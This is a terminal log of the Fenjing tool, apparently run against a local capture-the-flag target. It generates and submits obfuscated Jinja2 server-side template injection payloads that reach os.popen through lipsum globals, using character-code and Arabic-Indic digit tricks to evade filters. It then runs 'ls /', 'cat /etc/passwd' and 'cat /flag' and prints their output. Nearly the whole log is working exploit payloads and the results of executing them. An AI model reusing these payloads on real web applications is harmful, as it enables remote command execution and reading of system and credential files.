➜  Fenjing git:(dev) ✗ python -m fenjing scan --url 'http://127.0.0.1:7888/secr3ttt' --interval 0.02
    ____             _ _
   / __/__  ____    (_|_)___  ____ _
INFO:[payload_gen] | Great, string('__import__') can be ip
INFO:[payload_gen] | Great, string('os') can be jm
INFO:[payload_gen] | Great, we generate module_os()
INFO:[payload_gen] | Great, string('popen') can be po
INFO:[payload_gen] | Great, string('echo f3n  j1ng;') can be ec
INFO:[payload_gen] | Great, we generate os_popen_obj('echo f3n  j1ng;')
INFO:[payload_gen] | Great, string('read') can be re
INFO:[payload_gen] | Great, we generate os_popen_read('echo f3n  j1ng;')
INFO:[cracker] | Testing generated payload.
INFO:[cracker] | Success! Now we can generate payloads.
Example/示例:
$>> ls /
$>> @eval 1+2+3+100000
$>> @get-config
Type @help for full help/输入@help获得完整帮助
$>> ls /
INFO:[full_payload_gen] | Start generating final expression...
INFO:[payload_gen] | Great, integer(108) can be 1٠٨
INFO:[payload_gen] | Great, integer(47) can be 4٧
INFO:[payload_gen] | Great, string('ls /') can be lipsum|attr(go)|attr(gi)(bi)|attr(gi)(by)((1٠٨,115,32,4٧),)|attr(de)()
INFO:[payload_gen] | Great, we generate os_popen_obj('ls /')
INFO:[payload_gen] | Great, we generate os_popen_read('ls /')
INFO:[cli] | Submit payload {%set jm=dict(OS=x)|first|lower%}{%set po=dict(POPEN=x)|first|lower%}{%set by=dict(BYTES=x)|first|lower%}{%set de=dict(DECODE=x)|first|lower%}{%set re=dict(READ=x)|first|lower%}{%set ndll={}|select()|trim|list|batch(25)|first|last%}{%set gl=dict(GLOBALS=x)|first|lower%}{%set go=(ndll,ndll,gl,ndll,ndll)|join%}{%set ge=dict(GETITEM=x)|first|lower%}{%set gi=(ndll,ndll,ge,ndll,ndll)|join%}{%set bu=dict(BUILTINS=x)|first|lower%}{%set bi=(ndll,ndll,bu,ndll,ndll)|join%}{%set im=dict(IMPORT=x)|first|lower%}{%set ip=(ndll,ndll,im,ndll,ndll)|join%}{{lipsum|attr(go)|attr(gi)(bi)|attr(gi)(ip)(jm)|attr(po)(lipsum|attr(go)|attr(gi)(bi)|attr(gi)(by)((1٠٨,115,32,4٧),)|attr(de)(),)|attr(re)()}}

        klf不会连这都绕不过去吧～
        你好！afs
bin
boot
dev
etc
flag
home
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var


$>> cat /etc/passwd
INFO:[full_payload_gen] | Start generating final expression...
INFO:[payload_gen] | Great, integer(99) can be 9٩
INFO:[payload_gen] | Great, integer(101) can be 1٠١
INFO:[payload_gen] | Great, integer(100) can be 1٠٠
INFO:[payload_gen] | Great, string('cat /etc/passwd') can be lipsum|attr(go)|attr(gi)(bi)|attr(gi)(by)((9٩,97,116,32,4٧,1٠١,116,9٩,4٧,112,97,115,115,119,1٠٠),)|attr(de)()
INFO:[payload_gen] | Great, we generate os_popen_obj('cat /etc/passwd')
INFO:[payload_gen] | Great, we generate os_popen_read('cat /etc/passwd')
INFO:[cli] | Submit payload {%set jm=dict(OS=x)|first|lower%}{%set po=dict(POPEN=x)|first|lower%}{%set by=dict(BYTES=x)|first|lower%}{%set de=dict(DECODE=x)|first|lower%}{%set re=dict(READ=x)|first|lower%}{%set ndll={}|select()|trim|list|batch(25)|first|last%}{%set gl=dict(GLOBALS=x)|first|lower%}{%set go=(ndll,ndll,gl,ndll,ndll)|join%}{%set ge=dict(GETITEM=x)|first|lower%}{%set gi=(ndll,ndll,ge,ndll,ndll)|join%}{%set bu=dict(BUILTINS=x)|first|lower%}{%set bi=(ndll,ndll,bu,ndll,ndll)|join%}{%set im=dict(IMPORT=x)|first|lower%}{%set ip=(ndll,ndll,im,ndll,ndll)|join%}{{lipsum|attr(go)|attr(gi)(bi)|attr(gi)(ip)(jm)|attr(po)(lipsum|attr(go)|attr(gi)(bi)|attr(gi)(by)((9٩,97,116,32,4٧,1٠١,116,9٩,4٧,112,97,115,115,119,1٠٠),)|attr(de)(),)|attr(re)()}}

        klf不会连这都绕不过去吧～
        你好！root:x:0:0:Super User:/root:/bin/bash
bin:x:1:1:bin:/bin:/usr/sbin/nologin
daemon:x:2:2:daemon:/sbin:/usr/sbin/nologin
adm:x:3:4:adm:/var/adm:/usr/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/usr/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/usr/sbin/nologin
operator:x:11:0:operator:/root:/usr/sbin/nologin
games:x:12:100:games:/usr/games:/usr/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/usr/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/usr/sbin/nologin
dbus:x:81:81:System Message Bus:/:/usr/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
tss:x:59:59:Account used for TPM access:/:/usr/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/usr/sbin/nologin
systemd-oom:x:999:999:systemd Userspace OOM Killer:/:/usr/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/usr/sbin/nologin
qemu:x:107:107:qemu user:/:/sbin/nologin
polkitd:x:998:997:User for polkitd:/:/sbin/nologin
avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
geoclue:x:997:996:User for geoclue:/var/lib/geoclue:/sbin/nologin
nm-openconnect:x:996:995:NetworkManager user for OpenConnect:/:/sbin/nologin
colord:x:995:994:User for colord:/var/lib/colord:/sbin/nologin
usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin
gluster:x:994:993:GlusterFS daemons:/run/gluster:/sbin/nologin
rtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin
pipewire:x:993:992:PipeWire System Daemon:/var/run/pipewire:/sbin/nologin
chrony:x:992:990:chrony system user:/var/lib/chrony:/sbin/nologin
dnsmasq:x:991:989:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/usr/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
saslauth:x:990:76:Saslauthd user:/run/saslauthd:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
openvpn:x:989:988:OpenVPN:/etc/openvpn:/sbin/nologin
nm-openvpn:x:988:987:Default user for running openvpn spawned by NetworkManager:/:/sbin/nologin
unbound:x:987:986:Unbound DNS resolver:/var/lib/unbound:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
flatpak:x:986:984:Flatpak system helper:/:/usr/sbin/nologin
gdm:x:42:42:GNOME Display Manager:/var/lib/gdm:/usr/sbin/nologin
gnome-initial-setup:x:985:983::/run/gnome-initial-setup/:/sbin/nologin
vboxadd:x:984:1::/var/run/vboxadd:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/usr/sbin/nologin
tcpdump:x:72:72:tcpdump:/:/usr/sbin/nologin
systemd-coredump:x:978:978:systemd Core Dumper:/:/usr/sbin/nologin
systemd-timesync:x:977:977:systemd Time Synchronization:/:/usr/sbin/nologin
cube:x:1000:1000:cube:/home/cube:/usr/bin/zsh
clash:x:976:976::/home/clash:/bin/bash
akmods:x:975:975:User is used by akmods to build akmod packages:/var/cache/akmods/:/sbin/nologin
caddy:x:974:970:Caddy web server:/var/lib/caddy:/sbin/nologin
nginx:x:973:969:Nginx web server:/var/lib/nginx:/sbin/nologin


$>> cat /flag
INFO:[full_payload_gen] | Start generating final expression...
INFO:[payload_gen] | Great, integer(102) can be 1٠٢
INFO:[payload_gen] | Great, integer(103) can be 1٠٣
INFO:[payload_gen] | Great, string('cat /flag') can be lipsum|attr(go)|attr(gi)(bi)|attr(gi)(by)((9٩,97,116,32,4٧,1٠٢,1٠٨,97,1٠٣),)|attr(de)()
INFO:[payload_gen] | Great, we generate os_popen_obj('cat /flag')
INFO:[payload_gen] | Great, we generate os_popen_read('cat /flag')
INFO:[cli] | Submit payload {%set jm=dict(OS=x)|first|lower%}{%set po=dict(POPEN=x)|first|lower%}{%set by=dict(BYTES=x)|first|lower%}{%set de=dict(DECODE=x)|first|lower%}{%set re=dict(READ=x)|first|lower%}{%set ndll={}|select()|trim|list|batch(25)|first|last%}{%set gl=dict(GLOBALS=x)|first|lower%}{%set go=(ndll,ndll,gl,ndll,ndll)|join%}{%set ge=dict(GETITEM=x)|first|lower%}{%set gi=(ndll,ndll,ge,ndll,ndll)|join%}{%set bu=dict(BUILTINS=x)|first|lower%}{%set bi=(ndll,ndll,bu,ndll,ndll)|join%}{%set im=dict(IMPORT=x)|first|lower%}{%set ip=(ndll,ndll,im,ndll,ndll)|join%}{{lipsum|attr(go)|attr(gi)(bi)|attr(gi)(ip)(jm)|attr(po)(lipsum|attr(go)|attr(gi)(bi)|attr(gi)(by)((9٩,97,116,32,4٧,1٠٢,1٠٨,97,1٠٣),)|attr(de)(),)|attr(re)()}}

        klf不会连这都绕不过去吧～
        你好！FLAG{SUCCESS!Y0U_M4DE_1T!}

       win.html
$>>
Bye!
➜  Fenjing git:(dev) ✗
